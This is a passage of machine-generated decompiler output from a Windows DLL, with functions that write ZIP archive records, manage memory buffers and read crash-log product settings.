      *(int *)(param_1 + 0x20) = *(int *)(param_1 + 0x20) - uVar6;
      *piVar4 = *piVar4 + uVar6;
      *(int *)(param_1 + 0x1c) = *(int *)(param_1 + 0x1c) + uVar6;
      *(int *)(param_1 + 0x18) = *(int *)(param_1 + 0x18) + uVar6;
      *(int *)(param_1 + 0x24) = *(int *)(param_1 + 0x24) + uVar6;
      *(int *)(param_1 + 0x4c) = *(int *)(param_1 + 0x4c) + uVar6;
    }
  }
  return local_8;
}



/* Function: FUN_10037b80 */

/* WARNING: Removing unreachable block (ram,0x10037cc2) */
/* WARNING: Removing unreachable block (ram,0x10037c97) */
/* WARNING: Removing unreachable block (ram,0x10037d05) */
/* WARNING: Removing unreachable block (ram,0x10037dbb) */
/* WARNING: Removing unreachable block (ram,0x10037d7f) */
/* WARNING: Removing unreachable block (ram,0x10037df7) */

int __fastcall FUN_10037b80(int param_1)

{
  undefined4 uVar1;
  undefined1 uVar2;
  undefined1 uVar3;
  undefined1 uVar4;
  int iVar5;
  undefined4 uVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  undefined4 local_c;
  undefined4 local_8;
  
  local_8 = 0;
  iVar8 = 0;
  local_c = 0;
  if (*(int *)(param_1 + 0xc) == 0) {
    return -0x66;
  }
  *(undefined4 *)(param_1 + 0x14) = 0;
  if ((*(int *)(param_1 + 0x60) == 8) && (*(int *)(param_1 + 100) == 0)) {
    do {
      if (*(int *)(param_1 + 0x20) == 0) {
        (**(code **)(**(int **)(param_1 + 0x409c) + 8))
                  (param_1 + 0x68,*(undefined4 *)(param_1 + 0x4c));
        *(undefined4 *)(param_1 + 0x4c) = 0;
        *(undefined4 *)(param_1 + 0x20) = 0x4000;
        *(int *)(param_1 + 0x1c) = param_1 + 0x68;
      }
      iVar7 = *(int *)(param_1 + 0x24);
      iVar8 = FUN_10001080(param_1 + 0x10,4);
      *(int *)(param_1 + 0x4c) = *(int *)(param_1 + 0x4c) + (*(int *)(param_1 + 0x24) - iVar7);
    } while (iVar8 == 0);
    if (iVar8 == 1) {
      iVar8 = 0;
    }
  }
  if ((*(int *)(param_1 + 0x4c) != 0) && (iVar8 == 0)) {
    iVar9 = 0;
    iVar5 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(param_1 + 0x68,*(int *)(param_1 + 0x4c))
    ;
    iVar7 = *(int *)(param_1 + 0x4c);
    *(undefined4 *)(param_1 + 0x4c) = 0;
    if (iVar5 != iVar7) {
      iVar9 = -1;
    }
    if (iVar9 == -1) {
      iVar8 = -1;
    }
  }
  if (*(int *)(param_1 + 0x60) == 8) {
    if (*(int *)(param_1 + 100) == 0) {
      iVar8 = FUN_10001860(param_1 + 0x10);
      *(undefined4 *)(param_1 + 0x48) = 0;
      goto LAB_10037c56;
    }
LAB_10037c6d:
    uVar6 = 0;
  }
  else {
LAB_10037c56:
    if (*(int *)(param_1 + 100) != 0) goto LAB_10037c6d;
    uVar6 = *(undefined4 *)(param_1 + 0x406c);
    local_c = *(undefined4 *)(param_1 + 0x18);
    local_8 = uVar6;
  }
  iVar7 = *(int *)(param_1 + 0x54);
  uVar1 = *(undefined4 *)(param_1 + 0x24);
  *(char *)(iVar7 + 0x10) = (char)uVar6;
  uVar2 = (undefined1)((uint)uVar6 >> 8);
  *(undefined1 *)(iVar7 + 0x11) = uVar2;
  uVar3 = (undefined1)((uint)uVar6 >> 0x10);
  *(undefined1 *)(iVar7 + 0x12) = uVar3;
  uVar4 = (undefined1)((uint)uVar6 >> 0x18);
  *(undefined1 *)(iVar7 + 0x13) = uVar4;
  iVar7 = *(int *)(param_1 + 0x54);
  *(char *)(iVar7 + 0x15) = (char)((uint)uVar1 >> 8);
  *(char *)(iVar7 + 0x16) = (char)((uint)uVar1 >> 0x10);
  *(char *)(iVar7 + 0x17) = (char)((uint)uVar1 >> 0x18);
  *(char *)(iVar7 + 0x14) = (char)uVar1;
  if (*(int *)(param_1 + 0x3c) == 1) {
    *(undefined2 *)(*(int *)(param_1 + 0x54) + 0x24) = 1;
  }
  iVar7 = *(int *)(param_1 + 0x54);
  *(char *)(iVar7 + 0x18) = (char)local_c;
  *(char *)(iVar7 + 0x19) = (char)((uint)local_c >> 8);
  *(char *)(iVar7 + 0x1a) = (char)((uint)local_c >> 0x10);
  *(char *)(iVar7 + 0x1b) = (char)((uint)local_c >> 0x18);
  if (iVar8 == 0) {
    iVar8 = FUN_100386d0(*(undefined4 *)(param_1 + 0x54),*(undefined4 *)(param_1 + 0x58));
  }
  FUN_100579ee(*(undefined4 *)(param_1 + 0x54));
  if (iVar8 != 0) goto LAB_10037e30;
  uVar6 = (**(code **)(**(int **)(param_1 + 0x409c) + 0xc))();
  iVar8 = (**(code **)(**(int **)(param_1 + 0x409c) + 0x10))(*(int *)(param_1 + 0x50) + 0xe,0);
  if (iVar8 == 0) {
    local_8 = CONCAT13(uVar4,CONCAT12(uVar3,CONCAT11(uVar2,(char)local_8)));
    iVar8 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_8,4);
    if ((iVar8 != 4) ||
       (local_8 = uVar1, iVar8 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_8,4),
       iVar8 != 4)) goto LAB_10037d58;
    local_8 = local_c;
    iVar8 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_8,4);
    iVar8 = -(uint)(iVar8 != 4);
  }
  else {
LAB_10037d58:
    iVar8 = -1;
  }
  iVar7 = (**(code **)(**(int **)(param_1 + 0x409c) + 0x10))(uVar6,0);
  if (iVar7 != 0) {
    iVar8 = -1;
  }
LAB_10037e30:
  *(int *)(param_1 + 0x4090) = *(int *)(param_1 + 0x4090) + 1;
  *(undefined4 *)(param_1 + 0xc) = 0;
  return iVar8;
}



/* Function: FUN_10037e50 */

/* WARNING: Removing unreachable block (ram,0x1003802e) */
/* WARNING: Removing unreachable block (ram,0x10038074) */

int __fastcall FUN_10037e50(int param_1)

{
  char cVar1;
  char *pcVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  char *pcVar8;
  int *piVar9;
  int iVar10;
  undefined4 in_stack_ffffffd8;
  undefined4 in_stack_ffffffdc;
  uint local_10;
  uint local_c;
  uint local_8;
  
  if (*(int *)(param_1 + 0x40a4) != 0) {
    return -0x66;
  }
  iVar10 = 0;
  *(undefined4 *)(param_1 + 0x40a0) = 0;
  *(undefined4 *)(param_1 + 0x40a4) = 2;
  local_c = 0;
  if (*(int *)(param_1 + 0xc) == 1) {
    iVar10 = FUN_10037b80(in_stack_ffffffd8,in_stack_ffffffdc);
  }
  pcVar2 = *(char **)(param_1 + 0x4094);
  if (pcVar2 == (char *)0x0) {
    local_10 = 0;
  }
  else {
    pcVar8 = pcVar2;
    do {
      cVar1 = *pcVar8;
      pcVar8 = pcVar8 + 1;
    } while (cVar1 != '\0');
    local_10 = (int)pcVar8 - (int)(pcVar2 + 1);
  }
  iVar5 = (**(code **)(**(int **)(param_1 + 0x409c) + 0xc))();
  if ((iVar10 == 0) && (piVar9 = *(int **)(param_1 + 4), piVar9 != (int *)0x0)) {
    uVar6 = 0;
    do {
      if (((iVar10 == 0) && (piVar9[2] != 0)) &&
         (iVar7 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(piVar9 + 4,piVar9[2]),
         uVar6 = local_c, iVar7 != piVar9[2])) {
        iVar10 = -1;
      }
      uVar6 = uVar6 + piVar9[2];
      piVar9 = (int *)*piVar9;
      local_c = uVar6;
    } while (piVar9 != (int *)0x0);
  }
  puVar4 = *(undefined4 **)(param_1 + 4);
  while (puVar4 != (undefined4 *)0x0) {
    puVar3 = (undefined4 *)*puVar4;
    FUN_100579ee(puVar4);
    puVar4 = puVar3;
  }
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  if (iVar10 == 0) {
    local_8 = 0x6054b50;
    iVar10 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_8,4);
    if (iVar10 == 4) {
      local_8 = local_8 & 0xffff0000;
      iVar10 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_8,2);
      if (iVar10 == 2) {
        local_8 = local_8 & 0xffff0000;
        iVar10 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_8,2);
        if (iVar10 == 2) {
          local_8._0_2_ = (undefined2)*(uint *)(param_1 + 0x4090);
          if (*(uint *)(param_1 + 0x4090) >> 0x10 != 0) {
            local_8._0_2_ = 0xffff;
          }
          iVar10 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_8,2);
          if (iVar10 == 2) {
            local_8._0_2_ = (undefined2)*(uint *)(param_1 + 0x4090);
            if (*(uint *)(param_1 + 0x4090) >> 0x10 != 0) {
              local_8._0_2_ = 0xffff;
            }
            iVar10 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_8,2);
            if (iVar10 == 2) {
              local_8 = local_c;
              iVar10 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_8,4);
              if (iVar10 == 4) {
                local_8 = iVar5 - *(int *)(param_1 + 0x408c);
                iVar10 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_8,4);
                if (iVar10 == 4) {
                  local_c._0_2_ = (undefined2)local_10;
                  if (local_10 >> 0x10 != 0) {
                    local_c._0_2_ = 0xffff;
                  }
                  iVar10 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&local_c,2);
                  if (iVar10 == 2) {
                    iVar10 = 0;
                    if ((local_10 != 0) &&
                       (uVar6 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(pcVar2,local_10),
                       uVar6 != local_10)) {
                      iVar10 = -1;
                    }
                    goto LAB_100380e8;
                  }
                }
              }
            }
          }
        }
      }
    }
    iVar10 = -1;
  }
LAB_100380e8:
  iVar5 = (**(code **)(**(int **)(param_1 + 0x409c) + 0x14))();
  if ((iVar5 != 0) && (iVar10 == 0)) {
    iVar10 = -1;
  }
  if (*(int *)(param_1 + 0x4094) != 0) {
    FUN_100579ee(*(int *)(param_1 + 0x4094));
  }
  if (iVar10 == 0) {
    *(undefined4 *)(param_1 + 0x40a4) = 0;
  }
  return iVar10;
}



/* Function: FUN_10038130 */

void __thiscall FUN_10038130(int param_1,int param_2,uint param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = 0;
  uVar2 = 0;
  if (((byte)param_3 & 3) == 1) {
    param_3 = 3;
    iVar1 = -0x80000000;
    uVar2 = 1;
  }
  else if ((param_3 & 4) == 0) {
    if ((param_3 & 8) != 0) {
      iVar1 = -0x40000000;
      param_3 = 2;
    }
  }
  else {
    iVar1 = -0x40000000;
    param_3 = 3;
  }
  if ((((param_2 != 0) && (iVar1 != 0)) &&
      (iVar1 = FUN_103b36b1(&stack0xfffffffc,param_2,iVar1,uVar2,0,param_3,0,0), iVar1 != -1)) &&
     (iVar1 != 0)) {
    *(int *)(param_1 + 4) = iVar1;
    *(undefined4 *)(param_1 + 8) = 0;
    return;
  }
  *(undefined4 *)(param_1 + 8) = 0xffffffff;
  return;
}



/* Function: FUN_100381c0 */

undefined4 __thiscall FUN_100381c0(int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  undefined4 local_8;
  
  local_8 = 0;
  iVar2 = *(int *)(param_1 + 4);
  if (iVar2 != 0) {
    iVar1 = FUN_10402748(iVar2,param_2,param_3,&local_8,0);
    if (iVar1 == 0) {
      iVar1 = FUN_103ebf67();
      if (iVar1 == 0x26) {
        iVar1 = 0;
      }
      *(int *)(param_1 + 8) = iVar1;
    }
    return *(undefined4 *)(iVar2 + -4);
  }
  return 0;
}



/* Function: FUN_10038210 */

undefined4 __thiscall FUN_10038210(int param_1,undefined4 param_2,undefined4 param_3)

{
  code *pcVar1;
  undefined4 uVar2;
  int iVar3;
  char extraout_CL;
  undefined4 unaff_EBX;
  bool bVar4;
  undefined4 local_8;
  
  local_8 = 0;
  bVar4 = false;
  if (*(int *)(param_1 + 4) == 0) {
    return 0;
  }
  FUN_100da0bf(*(int *)(param_1 + 4),param_2,param_3,&local_8,0);
  if (bVar4) {
    iVar3 = CONCAT31((int3)((uint)unaff_EBX >> 8),(char)unaff_EBX + extraout_CL + '\x01');
    if (iVar3 == 0x26) {
      iVar3 = 0;
    }
    *(int *)(param_1 + 8) = iVar3;
    return local_8;
  }
  pcVar1 = (code *)swi(3);
  uVar2 = (*pcVar1)();
  return uVar2;
}



/* Function: FUN_10038260 */

/* WARNING: Instruction at (ram,0x10038285) overlaps instruction at (ram,0x10038281)
    */

undefined4 __fastcall FUN_10038260(int param_1)

{
  int iVar1;
  code *pcVar2;
  undefined4 uVar3;
  byte extraout_CL;
  int unaff_EBX;
  int unaff_EBP;
  undefined2 in_CS;
  bool bVar4;
  char cVar5;
  char cVar6;
  undefined2 uVar7;
  
  iVar1 = *(int *)(param_1 + 4);
  cVar6 = '\0';
  cVar5 = iVar1 < 0;
  bVar4 = iVar1 == 0;
  if (bVar4) {
    return 0xffffffff;
  }
  FUN_1030ee36(iVar1,0,0,1);
  if (!bVar4 && cVar6 == cVar5) {
    uVar7 = 0x1003;
    FUN_100e39f3(*(undefined4 *)(unaff_EBP + 0xc));
    (*(code *)(param_1 + -0x3d))(CONCAT22(uVar7,in_CS));
    pcVar2 = (code *)swi(3);
    uVar3 = (*pcVar2)();
    return uVar3;
  }
  *(byte *)(unaff_EBX + -0x74a103bb) = *(byte *)(unaff_EBX + -0x74a103bb) | extraout_CL;
  uVar3 = in(0x5d);
  return uVar3;
}



/* Function: FUN_10038290 */

undefined4 __thiscall FUN_10038290(int param_1,undefined4 param_2,int param_3)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 uVar3;
  
  uVar3 = 0xffffffff;
  if (param_3 == 0) {
    uVar1 = 0;
  }
  else if (param_3 == 1) {
    uVar1 = 1;
  }
  else {
    if (param_3 != 2) {
      return 0xffffffff;
    }
    uVar1 = 2;
  }
  if (*(int *)(param_1 + 4) != 0) {
    iVar2 = FUN_103912b6(*(undefined4 *)(param_1 + 4),param_2,0,uVar1);
    if (iVar2 == -1) {
      uVar3 = FUN_1009d3e8();
      *(undefined4 *)(param_1 + 8) = uVar3;
      return 0xffffffff;
    }
    uVar3 = 0;
  }
  return uVar3;
}



/* Function: FUN_10038300 */

undefined4 __fastcall FUN_10038300(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    (*DAT_10079270)(*(int *)(param_1 + 4));
    return 0;
  }
  return 0xffffffff;
}



/* Function: FUN_10038320 */

undefined4 __fastcall FUN_10038320(int param_1)

{
  return *(undefined4 *)(param_1 + 8);
}



/* Function: FUN_10038330 */

void __fastcall FUN_10038330(int param_1)

{
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)(param_1 + 0xc);
  if ((uint)(*(int *)(param_1 + 0x14) - *(int *)(param_1 + 0xc)) < 500000) {
    FUN_100385f0(500000);
  }
  *(uint *)(param_1 + 8) = (*(int *)(param_1 + 0x14) != *(int *)(param_1 + 0xc)) - 1;
  return;
}



/* Function: FUN_10038380 */

rsize_t __thiscall FUN_10038380(int param_1,void *param_2,uint param_3)

{
  rsize_t _MaxCount;
  rsize_t *prVar1;
  uint local_8;
  
  local_8 = (*(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc)) - *(int *)(param_1 + 4);
  prVar1 = &param_3;
  if (local_8 <= param_3) {
    prVar1 = &local_8;
  }
  _MaxCount = *prVar1;
  _memcpy_s(param_2,param_3,(void *)(*(int *)(param_1 + 0xc) + *(int *)(param_1 + 4)),_MaxCount);
  *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + _MaxCount;
  return _MaxCount;
}



/* Function: FUN_100383e0 */

/* WARNING: Removing unreachable block (ram,0x10038475) */

rsize_t __thiscall FUN_100383e0(int param_1,void *param_2,uint param_3)

{
  rsize_t _DstSize;
  rsize_t *prVar1;
  uint uVar2;
  uint local_c;
  uint local_8;
  
  if (((uint)(*(int *)(param_1 + 0x14) - *(int *)(param_1 + 0xc)) < *(int *)(param_1 + 4) + param_3)
     && (uVar2 = (*(int *)(param_1 + 0x14) - *(int *)(param_1 + 0xc)) * 2,
        (uint)(*(int *)(param_1 + 0x14) - *(int *)(param_1 + 0xc)) < uVar2)) {
    FUN_100385f0(uVar2);
  }
  uVar2 = *(int *)(param_1 + 4) + param_3;
  if ((uint)(*(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc)) < uVar2) {
    FUN_100385a0(uVar2);
  }
  local_c = (*(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc)) - *(int *)(param_1 + 4);
  local_8 = param_3;
  prVar1 = &local_8;
  if (local_c <= param_3) {
    prVar1 = &local_c;
  }
  _DstSize = *prVar1;
  _memcpy_s((void *)(*(int *)(param_1 + 0xc) + *(int *)(param_1 + 4)),_DstSize,param_2,param_3);
  *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + _DstSize;
  return _DstSize;
}



/* Function: FUN_10038480 */

uint __fastcall FUN_10038480(int param_1)

{
  if ((uint)(*(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc)) < *(uint *)(param_1 + 4)) {
    *(undefined4 *)(param_1 + 8) = 0xffffffff;
    return 0xffffffff;
  }
  return *(uint *)(param_1 + 4);
}



/* Function: FUN_100384a0 */

int __thiscall FUN_100384a0(int param_1,uint param_2,int param_3)

{
  int iVar1;
  
  iVar1 = -1;
  if (param_3 == 0) {
    if (((int)param_2 < 0) || ((uint)(*(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc)) < param_2)
       ) {
      *(undefined4 *)(param_1 + 8) = 0xfffffffd;
      if (*(int *)(param_1 + 8) < 0) {
        iVar1 = *(int *)(param_1 + 8);
      }
      return iVar1;
    }
  }
  else {
    if (param_3 != 1) {
      if (param_3 != 2) {
        *(undefined4 *)(param_1 + 8) = 0xfffffffc;
        if (*(int *)(param_1 + 8) < 0) {
          iVar1 = *(int *)(param_1 + 8);
        }
        return iVar1;
      }
      if ((*(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc)) + param_2 <=
          (uint)(*(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc))) {
        *(uint *)(param_1 + 4) = (*(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc)) + param_2;
        iVar1 = 0;
        if (*(int *)(param_1 + 8) < 0) {
          iVar1 = *(int *)(param_1 + 8);
        }
        return iVar1;
      }
      *(undefined4 *)(param_1 + 8) = 0xfffffffe;
      if (*(int *)(param_1 + 8) < 0) {
        iVar1 = *(int *)(param_1 + 8);
      }
      return iVar1;
    }
    param_2 = *(int *)(param_1 + 4) + param_2;
    if ((uint)(*(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc)) <= param_2) {
      *(undefined4 *)(param_1 + 8) = 0xffffffff;
      if (*(int *)(param_1 + 8) < 0) {
        iVar1 = *(int *)(param_1 + 8);
      }
      return iVar1;
    }
  }
  *(uint *)(param_1 + 4) = param_2;
  iVar1 = 0;
  if (*(int *)(param_1 + 8) < 0) {
    iVar1 = *(int *)(param_1 + 8);
  }
  return iVar1;
}



/* Function: FUN_10038580 */

undefined4 __fastcall FUN_10038580(int param_1)

{
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0xffffffff;
  return 0;
}



/* Function: FUN_100385a0 */

void __thiscall FUN_100385a0(int *param_1,uint param_2)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = *param_1;
  uVar2 = param_1[1] - iVar1;
  if (uVar2 <= param_2) {
    if (param_2 <= uVar2) {
      return;
    }
    FUN_10038660((iVar1 - param_1[1]) + param_2);
    FUN_1005ff60(param_1[1],0,(*param_1 - param_1[1]) + param_2);
    iVar1 = *param_1;
  }
  param_1[1] = iVar1 + param_2;
  return;
}



/* Function: FUN_100385f0 */

void __thiscall FUN_100385f0(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  code *pcVar3;
  int iVar4;
  
  iVar4 = 0;
  if ((param_2 != 0) && (iVar4 = FUN_100582fa(param_2), iVar4 == 0)) {
    FUN_10056a39();
    pcVar3 = (code *)swi(3);
    (*pcVar3)();
    return;
  }
  FUN_10057b70(iVar4,*param_1,param_1[1] - *param_1);
  iVar1 = *param_1;
  iVar2 = param_1[1];
  if (iVar1 != 0) {
    thunk_FUN_100579ee(iVar1);
  }
  *param_1 = iVar4;
  param_1[2] = iVar4 + param_2;
  param_1[1] = iVar4 + (iVar2 - iVar1);
  return;
}



/* Function: FUN_10038660 */

void __thiscall FUN_10038660(int *param_1,uint param_2)

{
  code *pcVar1;
  uint uVar2;
  
  if (param_2 <= (uint)(param_1[2] - param_1[1])) {
    return;
  }
  if (param_2 <= (*param_1 - param_1[1]) - 1U) {
    uVar2 = param_1[2] - *param_1;
    if (-(uVar2 >> 1) - 1 < uVar2) {
      FUN_100385f0();
      return;
    }
    FUN_100385f0();
    return;
  }
  FUN_10056a6a("vector<T> too long");
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_100386d0 */

undefined4 __thiscall FUN_100386d0(undefined4 *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined1 *puVar3;
  undefined1 *puVar4;
  uint uVar5;
  uint uVar6;
  
  if (param_1 == (undefined4 *)0x0) {
    return 0xffffff98;
  }
  if (param_1[1] == 0) {
    puVar1 = (undefined4 *)FUN_100581b4(0x1000);
    if (puVar1 != (undefined4 *)0x0) {
      *puVar1 = 0;
      puVar1[2] = 0;
      puVar1[1] = 0xff0;
    }
    param_1[1] = puVar1;
    *param_1 = puVar1;
    if (puVar1 == (undefined4 *)0x0) {
      return 0xffffff98;
    }
  }
  puVar1 = (undefined4 *)param_1[1];
  if (param_3 != 0) {
    do {
      puVar2 = puVar1;
      if (puVar1[1] == 0) {
        puVar2 = (undefined4 *)FUN_100581b4(0x1000);
        if (puVar2 != (undefined4 *)0x0) {
          *puVar2 = 0;
          puVar2[2] = 0;
          puVar2[1] = 0xff0;
        }
        *puVar1 = puVar2;
        if (puVar2 == (undefined4 *)0x0) {
          return 0xffffff98;
        }
        param_1[1] = puVar2;
      }
      uVar5 = param_3;
      if ((uint)puVar2[1] < param_3) {
        uVar5 = puVar2[1];
      }
      puVar3 = (undefined1 *)((int)puVar2 + puVar2[2] + 0x10);
      if (uVar5 != 0) {
        puVar4 = puVar3;
        uVar6 = uVar5;
        do {
          *puVar4 = puVar4[param_2 - (int)puVar3];
          uVar6 = uVar6 - 1;
          puVar4 = puVar4 + 1;
        } while (uVar6 != 0);
      }
      puVar2[2] = puVar2[2] + uVar5;
      puVar2[1] = puVar2[1] - uVar5;
      param_2 = param_2 + uVar5;
      param_3 = param_3 - uVar5;
      puVar1 = puVar2;
    } while (param_3 != 0);
  }
  return 0;
}



/* Function: FUN_100387c0 */

undefined4 * __thiscall FUN_100387c0(undefined4 *param_1,undefined4 param_2)

{
  *param_1 = 1;
  FUN_1003cef0(param_2,1);
  param_1[0x12] = 0;
  return param_1;
}



/* Function: FUN_100387f0 */

undefined4 * FUN_100387f0(undefined4 param_1,int *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076ec8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if ((DAT_1009b5cc & 1) == 0) {
    DAT_1009b5cc = DAT_1009b5cc | 1;
    DAT_1009b5d0 = 0;
    FUN_10057b51(&LAB_10078870,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  }
  param_2 = (int *)*param_2;
  if (param_2 != (int *)0x0) {
    LOCK();
    *param_2 = *param_2 + 1;
    UNLOCK();
  }
  local_8 = 0;
  puVar2 = (undefined4 *)FUN_100388c0(param_1,&param_2,2);
  puVar3 = &DAT_1009b5d0;
  if (puVar2 != (undefined4 *)0x0) {
    puVar3 = puVar2;
  }
  if (param_2 != (int *)0x0) {
    LOCK();
    iVar1 = *param_2;
    *param_2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(param_2);
    }
  }
  ExceptionList = local_10;
  return puVar3;
}



/* Function: FUN_100388c0 */

void FUN_100388c0(short *param_1,int *param_2,int param_3)

{
  int *piVar1;
  undefined4 *puVar2;
  int *piVar3;
  int iVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 uVar8;
  undefined4 uVar9;
  wchar_t *pwVar10;
  wchar_t *pwVar11;
  int *local_64 [2];
  int *local_5c;
  int *local_58;
  int *local_54;
  undefined4 local_50;
  int *local_4c [2];
  int *local_44;
  int *local_3c;
  int *local_38;
  int local_34;
  int *local_30;
  int local_2c;
  uint local_28;
  uint uStack_24;
  uint uStack_20;
  uint uStack_1c;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076f7b;
  local_10 = ExceptionList;
  local_18 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_30 = param_2;
  if ((param_1 == (short *)0x0) || (*param_1 != 0)) {
    piVar1 = (int *)FUN_1000bd10(local_18);
  }
  else {
    piVar1 = (int *)FUN_1000ba60();
  }
  local_8 = 0;
  local_3c = piVar1;
  puVar2 = (undefined4 *)FUN_1000ae10(local_64);
  local_5c = (int *)*puVar2;
  if (local_5c != (int *)0x0) {
    LOCK();
    *local_5c = *local_5c + 1;
    UNLOCK();
  }
  local_58 = (int *)0x0;
  local_54 = (int *)0x0;
  local_8 = CONCAT31(local_8._1_3_,4);
  local_44 = local_5c;
  if ((local_5c != (int *)0x0) && (local_5c != (int *)0xfffffff4)) {
    FUN_1003e4a0(0);
    local_44 = local_5c;
  }
  local_5c = local_44;
  if (local_64[0] != (int *)0x0) {
    LOCK();
    iVar4 = *local_64[0];
    *local_64[0] = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_64[0]);
    }
  }
  local_8 = CONCAT31(local_8._1_3_,7);
  if (piVar1 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar1;
    *piVar1 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar1);
    }
  }
  if (((local_54 == (int *)0x0) || (local_54 == (int *)0xfffffff4)) || (local_54[2] == 0)) {
    if ((param_1 == (short *)0x0) || (*param_1 != 0)) {
      piVar1 = (int *)FUN_1000bd10();
    }
    else {
      piVar1 = (int *)FUN_1000ba60();
    }
    local_8 = CONCAT31(local_8._1_3_,8);
    local_44 = piVar1;
    piVar3 = (int *)FUN_1000ae10(&local_3c);
    if (*piVar3 == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = *piVar3 + 0xc;
    }
    FUN_10006250("No known modules found in \'%s\'\n",iVar4);
    if (local_3c != (int *)0x0) {
      LOCK();
      iVar4 = *local_3c;
      *local_3c = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_3c);
      }
    }
    local_8 = CONCAT31(local_8._1_3_,7);
    if (piVar1 != (int *)0x0) {
      LOCK();
      iVar4 = *piVar1;
      *piVar1 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(piVar1);
      }
    }
    *(undefined4 *)(local_34 + 0x48) = 1;
    FUN_1003e4a0(1);
    local_44 = local_5c;
  }
  if (((local_54 == (int *)0x0) || (local_54 == (int *)0xfffffff4)) || (local_54[2] == 0)) {
    if ((param_1 == (short *)0x0) || (*param_1 != 0)) {
      piVar1 = (int *)FUN_1000bd10();
    }
    else {
      piVar1 = (int *)FUN_1000ba60();
    }
    local_8 = CONCAT31(local_8._1_3_,9);
    local_3c = piVar1;
    piVar3 = (int *)FUN_1000ae10(local_4c);
    if (*piVar3 == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = *piVar3 + 0xc;
    }
    FUN_10006250("No known modules found in \'%s\'\n",iVar4);
    if (local_4c[0] != (int *)0x0) {
      LOCK();
      iVar4 = *local_4c[0];
      *local_4c[0] = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_4c[0]);
      }
    }
    if (piVar1 != (int *)0x0) {
      LOCK();
      iVar4 = *piVar1;
      *piVar1 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(piVar1);
      }
    }
    goto LAB_100393fa;
  }
  if ((local_30 != (int *)0x0) && (param_3 == 1)) {
    FUN_10026a20(&local_54);
  }
  FUN_1003cef0(param_1,0);
  local_8._0_1_ = 10;
  iVar4 = FUN_1003d2c0(L"crashlog");
  if (((iVar4 != 0) && (iVar4 = FUN_1003d2c0(L"crashlog"), iVar4 != 0)) &&
     (iVar4 = FUN_1003d2c0(L"product"), iVar4 != 0)) {
    pwVar10 = L"product";
    FUN_1003d2c0(L"crashlog");
    iVar4 = FUN_1003d2c0(pwVar10);
    if ((iVar4 != 0) && (iVar4 = FUN_1003d2c0(L"prodname"), iVar4 != 0)) {
      local_50 = 0;
      local_8._0_1_ = 0xb;
      FUN_10026a20(&local_54);
      pwVar11 = L"prodname";
      pwVar10 = L"product";
      FUN_1003d2c0(L"crashlog");
      FUN_1003d2c0(pwVar10);
      FUN_1003d2c0(pwVar11);
      puVar2 = (undefined4 *)FUN_1003d440();
      piVar1 = (int *)*puVar2;
      if (piVar1 != (int *)0x0) {
        LOCK();
